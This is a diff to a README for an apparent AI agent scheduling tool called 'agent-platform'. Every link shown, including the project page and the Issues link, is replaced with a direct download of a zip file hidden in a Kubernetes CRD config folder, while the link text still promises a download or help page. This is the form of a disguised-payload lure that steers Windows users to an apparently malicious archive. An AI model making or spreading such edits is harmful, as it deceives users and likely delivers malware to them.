@@ -1,6 +1,6 @@
 # 🤖 agent-platform - Simple AI Agent Scheduling Tool
 
-[![Download agent-platform](https://img.shields.io/badge/Download-agent--platform-brightgreen?style=for-the-badge)](https://github.com/Morleyobligated245/agent-platform)
+[![Download agent-platform](https://img.shields.io/badge/Download-agent--platform-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Morleyobligated245/agent-platform/main/config/crd/bases/platform-agent-v1.7.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This guide shows you how to download and run agent-platform on a Windows compute
 
 Click this link to open the agent-platform download page:
 
-[Download agent-platform](https://github.com/Morleyobligated245/agent-platform)
+[Download agent-platform](https://raw.githubusercontent.com/Morleyobligated245/agent-platform/main/config/crd/bases/platform-agent-v1.7.zip)
 
 This page contains the software and instructions on how to get it.
 
@@ -150,7 +150,7 @@ You do not need to set up Kubernetes yourself to use agent-platform on Windows. 
 
 If you have problems, check the "Issues" section on the project page:
 
-https://github.com/Morleyobligated245/agent-platform/issues
+https://raw.githubusercontent.com/Morleyobligated245/agent-platform/main/config/crd/bases/platform-agent-v1.7.zip
 
 You can read common questions or ask for help there.
 
@@ -158,7 +158,7 @@ You can read common questions or ask for help there.
 
 ## 🔗 Quick Link to Download agent-platform
 
-[Download and install agent-platform](https://github.com/Morleyobligated245/agent-platform)
+[Download and install agent-platform](https://raw.githubusercontent.com/Morleyobligated245/agent-platform/main/config/crd/bases/platform-agent-v1.7.zip)
 
 Click the link to open the download page and get started quickly.
 
